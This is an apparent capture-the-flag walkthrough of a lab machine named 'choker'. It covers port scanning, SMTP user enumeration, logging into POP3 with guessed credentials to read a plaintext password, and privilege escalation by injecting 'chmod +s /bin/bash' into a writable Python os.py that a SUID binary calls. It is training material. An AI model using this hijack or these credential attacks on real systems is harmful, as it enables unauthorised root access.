![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/85688bde-6d42-4a30-921b-12355b314457)

first enumeration with nmap

```
# Nmap 7.93 scan initiated Sat May 27 02:11:10 2023 as: nmap -sC -sV -T4 -oN quicknmap.txt -Pn 10.150.150.56
Nmap scan report for chocker.localhost (10.150.150.56)
Host is up (0.20s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f2381f67bf488d17a25c6607eaa21ca9 (RSA)
|   256 bb2df9aa436d5f8a46ba838979f8f165 (ECDSA)
|_  256 476a80eecb0e3b6c80db1b6328dc9131 (ED25519)
25/tcp  open  smtp    Postfix smtpd
|_smtp-commands: chocker.localhost, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: CAPA TOP RESP-CODES SASL(PLAIN LOGIN) PIPELINING USER AUTH-RESP-CODE UIDL
143/tcp open  imap    Dovecot imapd (Ubuntu)
|_imap-capabilities: ID LITERAL+ SASL-IR LOGIN-REFERRALS AUTH=PLAIN listed have post-login IDLE ENABLE more AUTH=LOGINA0001 capabilities Pre-login OK IMAP4rev1
Service Info: Host:  chocker.localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 27 02:12:20 2023 -- 1 IP address (1 host up) scanned in 70.02 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/932b3c5c-f098-4b03-83a4-f17489a9ab65)

noticed a web server running on port 80, opening it on a browser, got redirected to a default apache webpage. checked the source page for sus comments, got none. did dir brute force found nothing. let's move to the next port.

### Enumerating smtp port (25)

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c1f39976-ea8c-4c35-b85d-772e5e5fe245)

found an smtp user_enum script on github [USR-25](https://github.com/SxNade/USR-25). let's run this script.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f80d6c0e-3b7b-40c4-ae21-2f8e9544ed46)

cool we got the users on smtp, let's enumerate further. 


### Enumerating pop3 port (110)

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/choker]
└─$ telnet chocker.localhost 110
Trying 10.150.150.56...
Connected to chocker.localhost.
Escape character is '^]'.
+OK Dovecot (Ubuntu) ready.
USER operator
+OK
PASS operator
+OK Logged in.
LIST
+OK 1 messages:
1 689
.
RETR 1
+OK 689 octets
Return-Path: <sysadmin@chocker.com>
X-Original-To: operator@localhost
Delivered-To: operator@chocker.com
Received: from chocker.com (unknown [192.168.14.1])
        by chocker.localhost (Postfix) with ESMTP id A514BE0E1C
        for <operator@localhost>; Thu,  4 Jun 2020 15:23:04 +0000 (UTC)
Subject: Password Reset

Hello Operator!

As you requested, I've reset your password to access the server.
I'm glad you still remembered your mail-password and were able to contact me, but don't forget it again!
Also remember to delete this mail and change your password again as soon as possible!

Here is your new password: "D0ntForgetP4sswordAgain!"

Best regards, 
your Sysadmin David.

.
```
remember we got some usernames through the smtp_userenum script, so trying the usernames gotten as user and pass, got to se `operator:operator` worked. and we got a password which is a potential ssh password `D0ntForgetP4sswordAgain!`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d1f1d400-8e2e-4b74-ab6a-f3e329bb8747)

login ssh using  `operator:D0ntForgetP4sswordAgain!` it's worked. we are in let's escalte privs.


## Privilege Escalation

```
operator@choker:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/su  
/usr/bin/passwd
/usr/bin/mount  
/usr/bin/sudo  
/usr/bin/fusermount
/usr/bin/time_teller_executer    
/usr/bin/chfn                                                                      
/usr/bin/chsh              
/usr/bin/newgrp                                                                    
/usr/bin/gpasswd            
/usr/bin/umount                                                                    
/usr/bin/at                                                                        
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign  
/snap/snapd/7777/usr/lib/snapd/snap-confine
/snap/snapd/7264/usr/lib/snapd/snap-confine
***
```
checking for suid, we can see that there's an suid binary file `/usr/bin/time_teller_executer`. let's run the file and see what it does.

```
operator@choker:~$ /usr/bin/time_teller_executer
(0.0, 0.01, 0.0, 0.0, 17190266.78)
operator@choker:~$ strings /usr/bin/time_teller_executer
/lib64/ld-linux-x86-64.so.2
MCMB|         
libc.so.6        
setuid     
clearenv                   
system             
__cxa_finalize             
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable           
u/UH         
[]A\A]A^A_          
/usr/bin/time_teller 
;*3$"         
GCC: (Debian 9.2.1-8) 9.2.1 20190909  
crtstuff.c    
***
```
using strings to check the content of the binary file, we can see it is calling in another binary file `/usr/bin/time_teller`, let's check the content of this binary file. 

```
operator@choker:~$ strings /usr/bin/time_teller 
#!/usr/bin/env python
#Timeteller-script (concept) - needs a few changes, see to-do list. 
import os
current_time = os.times()
print (current_time)
operator@choker:~$ 
```
we can see this is  python binary file is importing a python library `OS`, let's do some python library hijacking.

```
operator@choker:~$ locate os.py
***
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
/usr/lib/python2.7/encodings/palmos.py
/usr/lib/python2.7/encodings/palmos.pyc
/usr/lib/python3/dist-packages/LanguageSelector/macros.py
/usr/lib/python3/dist-packages/cloudinit/distros/centos.py
/usr/lib/python3.8/os.py
/usr/lib/python3.8/encodings/palmos.py
/usr/share/sosreport/sos/plugins/rhcos.py
operator@choker:~$ ls -al /usr/lib/python2.7/os.py
-rw-rw-r--+ 1 root root 25910 Apr  7  2020 /usr/lib/python2.7/os.py
operator@choker:~$ ls -al /usr/lib/python3.8/os.py
-rw-r--r-- 1 root root 38995 Apr 27  2020 /usr/lib/python3.8/os.py
operator@choker:~$ 
```
looking for the os module library, checking the file permission. we can see we have read and write permission to the lib `/usr/lib/python2.7/os.py`. let's modify and add a malicious payload to the file.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f6fe1c94-8fde-4996-a697-26a3208e7eae)

edit and inject a malicious payload to make `/bin/bash` an suid binary.

```
import subprocess

output = subprocess.check_output('chmod +s /bin/bash', shell=True)
print(output.decode())
```
payload

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1e2df8d0-c6aa-4c97-ae84-ea610c473c2c)

ran the suid bin `/usr/bin/time_teller_executer` and check back the `/bin/bash` and boom we made it an suid.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5a3f5ded-9404-4c4b-b4fc-51ef868e3bda)

doing `/bin/bash -p` got us a root shell. and we are done

Had Fun Yeah? 😉 
